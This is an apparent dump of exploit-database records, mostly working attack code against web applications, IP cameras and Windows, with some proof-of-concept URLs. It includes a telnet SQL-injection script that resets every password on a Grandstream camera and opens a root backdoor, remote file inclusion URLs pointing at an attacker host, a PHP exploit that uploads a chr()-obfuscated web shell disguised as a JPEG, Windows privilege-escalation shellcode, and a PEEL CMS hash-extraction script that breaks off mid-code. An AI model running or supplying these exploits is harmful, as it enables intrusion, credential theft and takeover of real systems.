Manage Photo"" 	 	Result	: http://127.0.0.1/phpbuddies/systemupload/profile/foot.phpshell.php	  	 	with a default configuration of this script, an attacker might be able to upload arbitrary 	files containing malicious PHP code due to multiple file extensions isn't properly checked 	 	Goo The IndonesianCoder!!! [!]===========================================================================[!]  [ Thx TO ]  [+] Hai Kumis Lele HAhaha Ab ah Benu Turune Ngiler !! [+] INDONESIAN CODER TEAM IndonesianHacker Malang CYber CREW Magelang Cyber [+] tukulesto,M3NW5,arianom,N4CK0,abah_benu,d0ntcry,bobyhikaru,gonzhack,senot [+] Contrex,YadoY666,yasea,bugs,Ronz,Pathloader,cimpli,MarahMerah.IBL13Z,r3m1ck [+] Coracore,Gh4mb4s,Jack-,VycOd,m0rgue,otong,CS-31,Yur4kha,Geni212   [ NOTE ]  [+] OJOK JOTOS2an YO .. [+] Minggir semua Arumbia Team Mau LEwat ;) [+] MBEM : lup u :"">  [ QUOTE ]  [+] INDONESIANCODER still r0x... [+] ARUmBIA TEam Was Here Cuy MINGIR Kabeh KAte lewat .. [+] Malang Cyber Crew & Magelang Cyber Community",remote,webapps,1
40441,"Grandsteam GXV3611_HD - SQL Injection # Exploit Title: Grandstream GXV3611_HD Telnet SQL Injection and backdoor command # Exploit Author: pizza1337 # Vendor Homepage: http://www.grandstream.com/ # Version: GXV3611_HD Core 1.0.3.6, 1.0.4.3 # GXV3611IR_HD Core 1.0.3.5 # Tested on: # -GXV3611_HD #  Bootloader Version: 	1.0.0.0 #  Core Version: 	1.0.4.3 #  Base Version: 	1.0.4.43 #  Firmware Version: 	1.0.4.43 # -GXV3611IR_HD #  Bootloader Version:  1.0.3.5 #  Core Version:        1.0.3.5 #  Base Version:        1.0.3.5 #  Firmware Version:    1.0.3.5 # CVE : CVE-2015-2866 # Category: remote # More information: # https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2866 # https://www.kb.cert.org/vuls/id/253708 # Description: # http://boredhackerblog.blogspot.com/2016/05/hacking-ip-camera-grandstream-gxv3611hd.html import telnetlib import sys  if len(sys.argv) < 2:     print ""USAGE: python %s IP_ADDRESS""%sys.argv[0]     quit()  conn = telnetlib.Telnet(sys.argv[1]) conn.read_until(""Username: "") conn.write(""';update user set password='a';--\r\n"") #This changes all the passwords to a, including the admin password conn.read_until(""Password: "") conn.write(""nothing\r\n"") conn.read_until(""Username: "") conn.write(""admin\r\n"") conn.read_until(""Password: "") conn.write(""a\r\n"") #Login with the new password conn.read_until(""> "") conn.write(""!#/ port lol\r\n"") #Backdoor command triggers telnet server to startup. For some reason, typing ""!#/ port"" does not seem to work. conn.read_until(""> "") conn.write(""quit\r\n"") conn.close() print ""Telnet into port 20000 with username root and no password to get shell"" #There is no login password",remote,remote,1
33200,68 Classifieds 4.1 - 'toplistings.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/36208/info     '68 Classifieds' is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.     These issues affect 68 Classifieds 4.1; other versions may also be affected.    http://www.example.com/toplistings.php?page=[code],remote,webapps,1
2717,"phpDynaSite 3.2.2 - 'racine' Remote File Inclusion **********************************************************************************************************                                                     WwW.Deltahacking.NeT                                                  **********************************************************************************************************  * dynasite3.2.2  * Class = Remote File Inclusion ;   * Download = http://jaist.dl.sourceforge.net:80/sourceforge/phpdynasite/dynasite3.2.2.tar.gz  * Found by = Dr.Pantagon (rezayavari2006@yahoo.com)  -------------------------------------------------------------------------------------------------------------------   - Vulnerable Code       include($racine.""connection.php"");  ++++++++++++++++++++++++++++++++++++++++++++  - Exploit:       http://[target]/[path]/function_log.php?racine=http://evilsite.com/shell?     http://[target]/[path]/function_balise_url.php?racine=http://evilsite.com/shell?     http://[target]/[path]/connection.php?racine=http://evilsite.com/shell?   ------------------------------------------------------------------------------------------------------------------  Gr33tz:  Dr.Torojan  **************************************************************************************************************  # milw0rm.com [2006-11-04]",remote,webapps,1
35911,"jclassifiedsmanager - Multiple Vulnerabilities # Exploit Title: jclassifiedsmanager Multiple Vulnerabilities # Google Dork: inurl:com_jclassifiedsmanager # Date: 26 Jan 2015 # Exploit Author: Sarath Nair aka AceNeon13  # Contact: @AceNeon13 # Greetings: HariKrishnan, Raj3sh.tv, Deepu.tv # Vendor Homepage: cmsjunkie.com # Software Link: http://www.cmsjunkie.com/classifieds-manager   # PoC Exploit: SQL Injection --------------------------------  http://localhost/jclassifiedsmanager/classifieds/offerring-ads?controller=displayads&view=displayads&task=viewad&id=[SQL Injection Here] ""id"" parameter is not sanitized.  # PoC Exploit: XSS Reflected -------------------------------- http://localhost/jclassifiedsmanager/classifieds?view=displayads7ed3b""onload%3d""alert(1)""87d4d&layout=offerring&controller=displayads&adtype=1 ""view"" parameter is not sanitized.  ######################################## # Vulnerability Disclosure Timeline:   2014-Dec-11:  Discovered vulnerability 2014-Dec-12:  Vendor Notification 2014-Dec-12:  Vendor Response/Feedback 2015-Jan-19:  Vendor Fix/Patch 2015-Jan-26:  Public Disclosure #######################################",remote,webapps,1
20610,"Allaire JRun 3.0 Servlet - Denial of Service source: https://www.securityfocus.com/bid/2337/info  A denial of service condition exists in the JRun web application server. Requesting multiple malformed URLs by way of the java servlet, will cause the JRun application server to stop responding.  http://target/servlet/........... (many "".""s)",remote,dos,1
5819,"ezcms 1.2 - Blind SQL Injection / Authentication Bypass -[*]+================================================================================+[*]- -[*]+		       EZCMS <= 1.2 Multiple Remote Vulnerabilitys	             +[*]- -[*]+================================================================================+[*]-    [*] Discovered By: t0pP8uZz [*] Discovered On: 19 MAY 2008 [*] Script Download: http://eztechhelp.com [*] DORK google/altavista: ""Powered by EZCMS""    [*] Vendor Has Not Been Notified!    [*] DESCRIPTION:   	EZCMS (all versions prior to date) suffers from 2 remote vulnerabilitys. 	 	One of these being a BLIND Sql Injection in ""index.php"" and the ""page"" variable is injectable. 	see example below.  	The second one being a insecure filemanager, the filemanager is hidden away in admin, the devs 	probarly thought no one would find it.. but here i am telling you  ;)   	see more below.    [*] Blind SQL Injection:  	http://site.com/index.php?page=1 and 1=1 	http://site.com/index.php?page=1 and 1=2    [*] Arbitrary Remote File Manager Access:  	http://site.com/ezcms/admin/filemanager/    [*] NOTE/TIP:   	no exploit coded for the blind injection, because no point due to you can get a easy shell 	through the file manager, althou if your curious, use SQLMap. (check sourceforge)  	the ""File Manager"" is a very easy to use bug, just browse to site.com/ezcms/admin/filemanager/ 	site.com being the actual site and you can upload/edit/delete/upload/move  files/folders.    [*] GREETZ:   	milw0rm.com, h4ck-y0u.org, CipherCrew !    [-] peace,   	t0pP8uZz    -[*]+================================================================================+[*]- -[*]+		       EZCMS <= 1.2 Multiple Remote Vulnerabilitys	             +[*]- -[*]+================================================================================+[*]-  # milw0rm.com [2008-06-14]",remote,webapps,1
14196,"Joomla! Component Techjoomla SocialAds - Persistent Cross-Site Scripting 1               ##########################################             1 0               I'm Sid3^effects member from Inj3ct0r Team             1 1               ##########################################             0 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  Name :    Joomla com_socialads Persistent Xss Vulnerability Date : july 3,2010 Critical Level 	: HIGH vendor URL :http://techjoomla.com/ Author : Sid3^effects aKa HaRi <shell_c99[at]yahoo.com> special thanks to : r0073r (inj3ct0r.com),L0rd CruSad3r,MaYur,MA1201,KeDar,Sonic,gunslinger_ greetz to :www.topsecure.net ,All ICW members and my friends :) luv y0 guyz  ####################################################################################################### Description: With SocialAds for JomSocial, you can create Facebook like demographically targeted ads to show on Your JomSocial Site. This extension allows advertisers to create their advertisement , Target the users they want to show the advertisement to, Decide if they want to pay by impressions or per click, Pay online & get the advertisement started up right away !  ####################################################################################################### Xploit : Persistent Xss Vulnerability  Step 1: Register :D  Step 2: Goto to the option called ""MANAGE YOUR ADS""  Step 3: In the ads description the attacker can post xss scripts   DEMO URL :http://server/js/index.php?option=com_socialads&view=showad&Itemid=94  Attack Pattern :"">><marquee><h1>XSS3d By Sid3^effects</h1><marquee>  Steap 4: Now  check your ads :P  DEMO URL :http://server/js/index.php?option=com_socialads&view=adsummary&Itemid=94&adid=23 ############################################################################################################### # 0day no more  # Sid3^effects",remote,webapps,1
8718,"douran portal 3.9.0.23 - Multiple Vulnerabilities Abysssec Inc Public Advisory  Description :   these vulnerabilites found one year ago and new version of this portal ""is not"" affect whith these vulnerabilites anymore  but still lots of web site uses of old version and are vulnerable and also new version is not ""fully secure"" . so because of patching there  is no point to keep these private anymore these vulnerabities are just for educational purpose and author will be not be responsible  for any damage using this vulnerabiltes .  Discovery : www.Abysssec.com   Title  : Douran Portal Multiple Remote Vulnerabilities Affected Version : DOURAN Portal   <= V3.9.0.23 Vendor  Site   : www.douran.com    Vulnerabilites :    1- File Download Vulnerbility in /Admin/ImportExport/download.aspx  Vulnerable Code :   		string strFileName = Request.Params[""Filename""]; 		if((strFileName != null) && (strFileName != """")) 		{ 			string strPath = Server.MapPath(""../../_DouranPortal/ExportPortal""); 			strPath += ""\\"" + strFileName; // Vulnerablity 			if(System.IO.File.Exists(strPath)) 			{ 				Response.Clear(); 				Response.ContentType = ""application/octet-stream""; 				Response.AddHeader(""Content-Transfer-Encoding"", ""binary""); 				Response.AddHeader(""Content-Disposition"", ""attachment; filename=\"""" + strFileName + ""\""""); 				Response.Flush(); 				Response.WriteFile(strPath); 				Response.End();  			.....   PoC : http://www.vulnerable.com/Admin/ImportExport/Download.aspx?filename=../../web.config    2- File Download Vulnerbility in /download.aspx  Vulnerable Code :   	string fileNameAttach = Request.Params[""FileNameAttach""]; 	string filePathAttach = Request.Params[""FilePathAttach""]; 	string originalAttachFileName = Request.Params[""OriginalAttachFileName""]; 	if((fileNameAttach != null) && (filePathAttach != """")) 	{ 		string strPath = Server.MapPath(filePathAttach + ""/"" + fileNameAttach); // Vulnerable 		if(System.IO.File.Exists(strPath)) 		{ 			System.IO.Stream iStream = null;  			// Buffer to read 1 mega bytes in chunk: 			int segmentLegthToRead = 1024 * 1024; 			byte[] buffer = new Byte[segmentLegthToRead]; 		......  PoC : http://www.vulnerable.com/download.aspx?FileNameAttach=/web.config  3- File Upload Vulnerability DesktopModules/fck/editor  Vulnerablity :   Using Fckeditor without any authentication will give ability to attacker to upload his / her own file and fckeditor won't check file extention it will give ability to attacker upload a malicius server side ASP / ASPX / PHP  / JSP . so this vulnerability can creation access to server / portal completely .  PoC : http://www.vulnerable.com/DesktopModules/fck/editor/filemanager/upload/test.html   4-Path Disclosure Vulnerablity In DesktopModules/DesktopCalendar/HZAN_pickercal.aspx  Vulnerable Code :   Calendar1.FullWidth = true; 	Calendar1.BigCaledar = bool.Parse((string)Request.QueryString[""calsize""]); 	if (!IsPostBack)  	{ 		Calendar1.Date = new DateTime(long.Parse((string)Request.QueryString[""curd""])); 		Calendar1.CalendarCulture = (HZAN.Calendar.CultureType)Enum.Parse(typeof(HZAN.Calendar.CultureType),(string)Request.QueryString[""culture""]); 		seldate = Calendar1.Date.ToShortDateString(); 		ChangeSelDate1(); 	}   PoC : http://www.vulnerable.com/DesktopModules/DesktopCalendar/HZAN_pickercal.aspx?calsize='   Final Note : for advanced security topics / sharing idea and etc ... please feel free to contact me at  : admin [at] abysssec.com  # milw0rm.com [2009-05-18]",remote,webapps,1
29053,"Image Gallery with Access Database - 'dispimage.asp?id' SQL Injection source: https://www.securityfocus.com/bid/21131/info  Image gallery with Access Database is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  http://www.example.com/path/dispimage.asp?id=[SQL Injection]",remote,webapps,1
31757,"ZyWALL 100 HTTP Referer Header - Cross-Site Scripting source: https://www.securityfocus.com/bid/29110/info  ZyWALL 100 is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   GET /blah.htm HTTP/1.1 Host: www.site.com Referer: blaaaa""><script>alert(12345)</script>aaaah.htm",remote,remote,1
2447,"KGB 1.87 - Local File Inclusion / Remote Code Execution #!/usr/bin/php -q -d short_open_tag=on  <? $devilteam	 	 +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -   - - [DEVIL TEAM THE BEST POLISH TEAM] - - + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - KGB 1.8+ <= 1.8 full (Local Inclusion) Remote Code Execution Exploit + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - [Script name: KGB 1.8+ 1.8 full - [Script site: http://www.kgb.xs.com.pl/ - [Download script: http://skrypty.webpc.pl/pobierz205.html  + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -          Find by: Kacper (a.k.a Rahim) + -    DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam + -          Contact: kacper1964@yahoo.pl -                        or -           http://www.rahim.webd.pl/ + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - Special Greetz: DragonHeart ;-) - Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus -                 SkD, nukedclx, Ramzes - - Greetz for all users DEVIL TEAM IRC Channel !! !@ Przyjazni nie da sie zamienic na marne korzysci @! + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -            Z Dedykacja dla osoby, -         bez ktorej nie mogl bym zyc... -           K.C:* J.M (a.k.a Magaja) + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"";   /* Szybka instrukcja jak exploit dziala :)  skrypt KGB 1.8+ jest podatny na local inclusion, poniewaz,  znajdujemy w pliku uploadzdj.php dzieki ktoremu mozemy uploadowac jakis obrazek, o wielkosci nie wiekszej niz 90kb,  natomiast w pliku kgcall.php znajdziemy kod: ... <? include(""kgengine/"".$engine); ?> ...   Czyli po uploadowaniu nowego avatara/obrazka (ktorym jest nasz skrypt) o nazwie devilteam.jpg  mozemy uzyc local include:  http://www.kgbskrypt/folder_z_kgb/kgcall.php?engine=../zdjecia/devilteam.jpg?cmd=ls -la No i mamy go! :)  Pozdrawiam Kacper  Jesli masz jakiekolwiek pytania to zapraszam na kanal IRC: 72.20.18.6:6667 #devilteam  */    print $devilteam; if ($argc<4) { echo ""Usage: php "".$argv[0]."" host path cmd options\r\n""; echo ""host:      target server (ip/hostname)\r\n""; echo ""path:      path to KGB\r\n""; echo ""cmd:       a shell command\r\n""; echo ""Options:\r\n""; echo ""   -p[port]:    specify a port other than 80\r\n""; echo ""   -P[ip:port]: specify a proxy\r\n""; echo ""Examples:\r\n""; echo ""php "".$argv[0]."" localhost /lists/ cat ./config/config.php\r\n""; echo ""php "".$argv[0]."" localhost /lists/ ls -la -p81\r\n""; echo ""php "".$argv[0]."" localhost / ls -la -P1.1.1.1:80\r\n""; die; } error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5); function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $cmd=""""; $port=80; $proxy="""";  for ($i=3; $i<=$argc-1; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } $cmd=urlencode($cmd); if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}   $shell= chr(0x3c).chr(0x3f).chr(0x70).chr(0x68).chr(0x70). chr(0x20).chr(0x6f).chr(0x62).chr(0x5f).chr(0x63). chr(0x6c).chr(0x65).chr(0x61).chr(0x6e).chr(0x28). chr(0x29).chr(0x3b).chr(0x65).chr(0x63).chr(0x68). chr(0x6f).chr(0x22).chr(0x44).chr(0x45).chr(0x56). chr(0x49).chr(0x4c).chr(0x20).chr(0x54).chr(0x45). chr(0x41).chr(0x4d).chr(0x20).chr(0x68).chr(0x34). chr(0x63).chr(0x6b).chr(0x20).chr(0x79).chr(0x30). chr(0x75).chr(0x22).chr(0x3b).chr(0x69).chr(0x6e). chr(0x69).chr(0x5f).chr(0x73).chr(0x65).chr(0x74). chr(0x28).chr(0x22).chr(0x6d).chr(0x61).chr(0x78). chr(0x5f).chr(0x65).chr(0x78).chr(0x65).chr(0x63). chr(0x75).chr(0x74).chr(0x69).chr(0x6f).chr(0x6e). chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65). chr(0x22).chr(0x2c).chr(0x30).chr(0x29).chr(0x3b). chr(0x70).chr(0x61).chr(0x73).chr(0x73).chr(0x74). chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x24). chr(0x5f).chr(0x47).chr(0x45).chr(0x54).chr(0x5b). chr(0x22).chr(0x63).chr(0x6d).chr(0x64).chr(0x22). chr(0x5d).chr(0x29).chr(0x3b).chr(0x64).chr(0x69). chr(0x65).chr(0x3b).chr(0x3f).chr(0x3e); srand(make_seed()); $evil=""devilteam.jpg""; $data='     -----------------------------ZGV2aWx0ZWFt--     Content-Disposition: form-data; name=""plik""; filename="".$evil."" 	Content-Type: image/jpeg\r\n\r\n"";     '.$shell.'     -----------------------------ZGV2aWx0ZWFt--     Content-Disposition: form-data; name="""";          Wyslij zdjecie     -----------------------------ZGV2aWx0ZWFt--     ';     $packet =""POST "".$p.""kgcall.php?engine=uploadzdj.php HTTP/1.1\r\n"";     $packet.=""User-Agent: Googlebot/2.1\r\n"";     $packet.=""Host: "".$host.""\r\n"";     $packet.=""Accept: text/plain\r\n"";     $packet.=""Referer: http://"".$host.$path.""kgcall.php?engine=uploadzdj.php\r\n"";     $packet.=""Content-Type: multipart/form-data; boundary=-----------------------------ZGV2aWx0ZWFt--\r\n"";     $packet.=""Content-Length: "".strlen($data).""\r\n"";     $packet.=$data; 	$packet.=""Connection: Close\r\n"";     show($packet);     sendpacketii($packet); 	 $packet =""GET "".$p.""kgcall.php?engine=../zdjecia/devilteam.jpg&cmd="".$cmd.""%00"" HTTP/1.0\r\n""; $packet.=""User-Agent: Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (strstr($html,""56789"")) {  $temp=explode(""56789"",$html);  echo $temp[1];  echo ""\r\nExploit work :)\r\n"";  echo ""\r\nDEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n"";  echo ""\r\nWe are The best Polish Hackers :)\r\n"";  die; } } ?>  # milw0rm.com [2006-09-28]",remote,webapps,1
21922,"Microsoft Windows XP/2000/NT 4.0 - NetDDE Privilege Escalation (1) // source: https://www.securityfocus.com/bid/5927/info  The Winlogon NetDDE Agent can be leveraged to allow local privilege escalation. This is related to the Microsoft Windows Window Message Subsystem Design Error Vulnerability (BID 5408). A local user can use a WM_COPYDATA message to send arbitrary code to NetDDE, which will be executed with Local System privileges when a second WM_TIMER message is sent.  // /////////// Copyright Serus 2002//////////////// //mailto:serus@users.mns.ru // //This program check system on winlogon bug present //Only for Windows 2000 //This is for check use only! //  #include <windows.h> #include <stdio.h>   void main(int argc, char *argv[ ], char *envp[ ] ) { 	char	*buf; 	DWORD	Addr = 0; 	BOOL	bExec = TRUE;  	unsigned char sc[] = {	// my simple shellcode, it calls CreateProcess function, 							// executes cmd.exe on user`s desktop and creates mutex. 		0x8B, 0xF4, 		0x68, 0x53, 0x45, 0x52, 0x00, 		0x8B, 0xDC, 0x54, 0x6A, 0x00, 0x6A, 0x00, 		0xB8, 0xC8, 0xD7, 0xE8, 0x77, 0xFF, 0xD0, 0x8B, 0xE6, 	    0x6A, 0x00, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x00,  		0x63, 0x6D, 0x64, 0x68, 0x61, 0x75, 0x6C, 0x74, 0x68, 0x5C, 0x44, 		0x65, 0x66, 0x68, 0x53, 0x74, 0x61, 0x30, 0x68, 0x00, 0x57, 0x69,  		0x6E, 0x8B, 0xD4, 0x42, 0xB9, 0x50, 0x00, 0x00, 0x00, 0x6A, 0x00,   		0xE2, 0xFC, 0x6A, 0x44, 0x83, 0xC4, 0x0C, 0x52, 0x83, 0xEC, 0x0C, 		0x8B, 0xC4, 0x83, 0xC0, 0x10, 0x50, 0x8B, 0xC4, 0x83, 0xC0, 0x08,  		0x50, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 		0x6A, 0x00, 0x83, 0xC2, 0x10, 0x52, 0x6A, 0x00, 0xB8, 0x4D, 0xA4, 		0xE9, 0x77, 0xFF, 0xD0, 0x8B, 0xE6, 0xC3 	};  	HWND			hWnd; 	COPYDATASTRUCT	cds; 	HMODULE			hMod; 	DWORD			ProcAddr; 	HANDLE			hMutex; 	char			mutname[4];  	printf(""\n\n==== GetAd by Serus (serus@users.mns.ru) ===="");  	// Get NetDDE Window 	hWnd = FindWindow(""NDDEAgnt"",""NetDDE Agent""); 	if(hWnd == NULL)  	{ 		MessageBox(NULL, ""Couldn't find NetDDE agent window"", ""Error"", MB_OK | MB_ICONSTOP); 		return; 	}  	// Get CreateProcessA and CreateMutexA entry addresses 	hMod = GetModuleHandle(""kernel32.dll""); 	ProcAddr = (DWORD)GetProcAddress(hMod, ""CreateProcessA"");  	if(ProcAddr == 0) 	{ 		MessageBox(NULL, ""Couldn't get CreateProcessA address"", ""Error"", MB_OK | MB_ICONSTOP); 		return; 	} 	*(DWORD *)(sc + 86 + 21) = ProcAddr;  	ProcAddr = (DWORD)GetProcAddress(hMod, ""CreateMutexA""); 	if(ProcAddr == 0) 	{ 		MessageBox(NULL, ""Couldn't get CreateProcessA address"", ""Error"", MB_OK | MB_ICONSTOP); 		return; 	} 	*(DWORD *)(sc + 15) = ProcAddr;  	//Generate random Mutex name 	srand(GetTickCount());  	do 	{ 		mutname[0] = 97 + rand()%25; 		mutname[1] = 65 + rand()%25; 		mutname[2] = 65 + rand()%25; 		mutname[3] = 0; 	} 	while((hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, mutname)) != 0); 	memcpy(sc + 3, mutname, 4);  	//Form buffer for SendMessage 	buf = (char *)malloc(1000); 	memset(buf, 0xC3, 1000); 	memcpy(buf, sc, sizeof(sc));  	cds.cbData = 1000; 	cds.dwData = 0; 	cds.lpData=(PVOID)buf;  	//If first login 	//Send shellcode buffer 	SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds); 	//Try execute it at 0x0080FA78 	PostMessage(hWnd, WM_TIMER, 1, (LPARAM)0x0080FA78); 	printf(""\n\nTrying at 0x%X"", 0x0080FA78);  	//If fails (perhaps not first login) 	//Try to bruteforce shellcode addresss 	for(Addr = 0x0120fa78; Addr < 0x10000000; Addr += 0x10000) 	{ 		//If mutex exists, shellcode has been executed 		if((hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, mutname)) != 0) 		{ 			//Success 			printf(""\nSuccess!!!\n""); 			printf(""\nWarning! You system has vulnerability!\n""); 			CloseHandle(hMutex); 			return; 		} 		printf(""\rTrying at 0x%X"", Addr);  		SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds); 		PostMessage(hWnd, WM_TIMER, 1, (LPARAM)Addr); 	}  	//Bug in winlogon not presents 	printf(""\n\nBad luck! Reboot and try again.\n\n"");  }",local,local,1
30949,"OpenBiblio 0.x - 'theme_del_confirm.php?name' Cross-Site Scripting source: https://www.securityfocus.com/bid/27053/info   OpenBiblio is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data. The issues include SQL-injection, cross-site scripting, HTML-injection, and local file-include vulnerabilities.   Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, execute arbitrary local scripts, retrieve potentially sensitive information, or exploit latent vulnerabilities in the underlying database.   These issues affect Openbiblio 0.5.2-pre4 and prior versions.   http://www.example.com/openbiblio/admin/theme_del_confirm.php?themeid=6&amp;name=[XSS]",local,webapps,1
5281,"PEEL CMS 3.x - Admin Hash Extraction / Arbitrary File Upload #!/usr/bin/php <?php  /*---------------------------------------------------------------*\  *  * Exploit:	PEEL CMS Admin Hash Extraction and Remote Upload  * Credits:	Charles ""real"" F. <charlesfol[at]hotmail.fr>  * URL: 	http://realn.free.fr/  * Date:	03-18-08  *  * Targets:	PEEL PREMIUM	PEEL POWERSELL  *      	PEEL INTEGRALE	PEEL PROFESSIONNELLE  *  * This exploit will use multiple vulns of multiple versions  * of PEEL to try to spawn a Remote Upload File.  *  * Special thanks to: ddx39.  * \*---------------------------------------------------------------*/  $md5loc = array( array('http://www.milw0rm.com/cracker/search.php','hash=','<TD align=""middle"" nowrap=""nowrap"" width=90>([^<]+)</TD><TD align=""middle"" nowrap=""nowrap"" width=90>cracked</TD></TR>'), array('http://gdataonline.com/qkhash.php?mode=txt&hash=','','</td><td width=""35%""><b>([^<]+)</b></td></tr>'), array('http://pepowned.free.fr/?act=&x=52&y=16&md5=','','Le Plain Text de <b>\w{32}</b> est : <b>([^<]+)</b>'), array('http://passcracking.ru/index.php','admin=false&admin2=77.php&datafromuser=','<td>\w{32}</td><td bgcolor=\#FF0000>([^<]+)</td><td>'), array('http://md5.rednoize.com/?p&s=md5&_=&q=','','<div id=""result"">([^<]+)</div>'), array('http://ice.breaker.free.fr/md5.php?hash=','','<b><br><br> - ([^<]+)<br><br><br><a href=http://ice\.breaker\.free\.fr/'), );  print ""\n""; print ""   PEEL CMS Admin Hash Extraction and Remote Upload\n""; print ""       by Charles \""real\"" F. <charlesfol[at]hotmail.fr>\n\n"";  if($argc<2) { 	print ""usage: php peel_exploit.php <url> [options]\n\n""; 	print ""Options:\n""; 	print "" -admin <login:pass>\tIf you have admin access, you can use this.\n""; 	print ""\nexample: php peel_exploit.php http://site.org/boutique/ -admin admin:passw0rd\n""; 	exit(); }  $url = $argv[1];  $xpl = new phpsploit(); $xpl->agent(""Mozilla Firefox"");  $admin = getparam(""admin""); if($admin) { 	print ""[*] Using admin login $admin\n""; 	list($login,$r) = explode("":"",$admin); 	attack($login,$r); 	print ""\n""; } else { 	/* --- ATTACK #1: LOGIN GUESSING --- */  	print ""[*] Attack #1\n""; 	$default = array( array(""info@peel.fr"",""admin""), array(""contact@peel.fr"",""cinema"") ); 	for($i=0;$i<sizeof($default);$i++) 	{ 		print ""[*] Trying with "".$default[$i][0]."":"".$default[$i][1]; 		if(attack($default[$i][0],$default[$i][1])==1) exit(); 	} 	print ""[*] Attack failed.\n\n"";  	/* --- ATTACK #2: MAGIC_QUOTES_GPC --- */ 	 	print ""[*] Attack #2\n""; 	print ""[*] magic_quotes_gpc=""; 	$c = $xpl->get($url.""phpinfo.php""); 	if($c && preg_match('#<tr><td class=""e"">magic_quotes_gpc</td><td class=""v"">([^<]+)</td>#i',$c,$b)) 	{ 		print ""$b[1]\n""; 	} else print ""?\n""; 	if($b[1]!=""On"" && false) 	{ 		attack(""'%20OR%20(priv=%27admin%27%20AND%201=1)%20/*"",'hell0'); 		if($b[1]==""Off"") exit(); 	} 	else print ""[*] Attack failed.\n\n""; 	 	/* --- ATTACK #3: SQL INJECTION --- */ 	 	print ""[*] Attack #3\n""; 	for($i=0;;$i++) 	{ 		$c = $xpl->get($url.""achat/historique_commandes.php?mode=details&id=-1&id_utilisateur=-1&timestamp=%2527%20UNION%20SELECT%20id_utilisateur,2,email,4,5,6,7,8,mot_passe,10,11,12,13,14,15%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%20$i,1/*"");  		preg_match(""#(\w+@\w+\.\w+)</a></td>#i"",$c,$login); 	